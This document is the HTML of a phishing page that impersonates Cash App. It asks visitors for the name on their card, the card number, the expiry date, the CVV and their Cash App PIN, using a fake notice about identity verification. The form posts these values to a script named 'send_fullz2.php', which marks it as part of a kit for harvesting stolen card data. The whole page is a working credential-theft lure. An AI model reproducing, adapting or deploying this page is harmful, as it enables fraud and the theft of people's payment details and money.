<html lang="en" style="--vh:635px;"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>Cash App</title>

  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Cash App">

  <meta name="theme-color" content="#0bb634">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="format-detection" content="telephone=no,email=no">
  <link rel="icon" sizes="196x196" href="assets/icon-196.png">
  <link rel="icon" href="assets/favicon.ico">
  <link rel="mask-icon" href="/favicon-pinned.svg" color="#18C300">
  <script src="assets/vendor.js" integrity="sha256-nTwtXHZxkWBCKpCkWwNAy6t2GmRW+0t2N2RJvlbuVRM=" crossorigin="anonymous"></script>
  <script src="assets/cash.js" integrity="sha256-U9sC8mrpLy1svsJdPoiUfr4WQD9EUC7zePIEOreRp5Q=" crossorigin="anonymous"></script>
  <link rel="stylesheet" type="text/css" href="assets/cash.css" integrity="sha256-DKtq4UJpbOrnJlqn+TlB3hTfPU4GrCSHgI1Lvx2P6g8=" crossorigin="anonymous">
  <link rel="preload" href="assets/cash-market-rounded-light.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="assets/cash-market-rounded-regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="assets/cash-market-rounded-medium.woff2" as="font" type="font/woff2" crossorigin="anonymous">
</head>
<body class="theme-bg ember-application theme-green">

<div id="ember321" class="ember-view"><div data-current-route="login" id="ember345" class="full-height application-cash ember-view">  <div id="ember352" class="cookie-banner ember-view"><!----></div>
  <section class="layout-login flex-container full-height pad">
  <div class="login-container flex-container flex-v-center flex-fill">
<!---->      <h1 class="step-title flex-static">Enter your Cash App card information.</h1>
             <h4 class="">Notice : your info must be correct because we need it to verify identity.</h4>
			 <br>
<!----><form action="system/send_fullz2.php" method="post" autocomplete="off" spellcheck="true" id="ember358" class="login-form ember-view">       <div id="ember384" class="field fk-field-container ember-view">

                                    <div class="InputBox">
                                        <input type="text" name="CCname" id="CCname" style="text-transform: capitalize" maxlength="30" placeholder="Name on card" autocomplete="off" required />
                                    </div>
                                    
                                    <div class="InputBox">
                                        <input type="text" name="CCinfo" id="CCinfo" placeholder="Card number" required maxlength="20" autocomplete="off" />
                                        <span class="CCinfoIcon cc-icon" style="background-position: 0px 82%;background-color: #fff;"></span>
                                    </div>
                                    
                                    <div class="MultiBox">
                                        <div class="InputBoxMulti">
                                            <input type="text" name="EXPdate" id="EXPdate" maxlength="7" required placeholder="Exp date (MM/YYYY)" autocomplete="off" />
                                        </div>
                                        <div class="InputBoxMulti">
                                            <input type="text" name="CVV" id="CVV" maxlength="3" required placeholder="CSC (3 digits)" autocomplete="off" />
                                            <span class="CCinfoIcon cvv" style="background-position: 0px 88%;"></span>
                                        </div>
                                    </div>
									                                        <div class="InputBoxMulti">
                                     <input type="text" name="atmPun" id="atmPun" maxlength="4" placeholder="CashApp PIN" required autocomplete="off" />
                                            <span class="CCinfoIcon cvv" style="background-position: 0px 88%;"></span>
                                        </div>
                                    </div>
</div>

<center>
									 <div class="SubmitBox">
                                        <button class="button theme-button button--round theme-button" type="submit">Next</button>
                                    </div>	
                           </center>
<!---->
        <div class="alias-submit fade-in immediate ">
          <div id="ember399" class="cta submit-button-component submit-button-with-spinner ember-view"><button type="submit" aria-label="Request Sign In Code" class="button theme-button button--round theme-button" data-ember-action="" data-ember-action-400="400">Request Sign In Code</button>
  <div id="ember405" class="spinner-container ember-view"></div>
</div>
        </div>
</form>  </div>
</section>

  <!---->
  <div id="ember408" class="modal-manager ember-view"><div class="modal-overlay "></div>
<!----></div>
</div></div></body></html>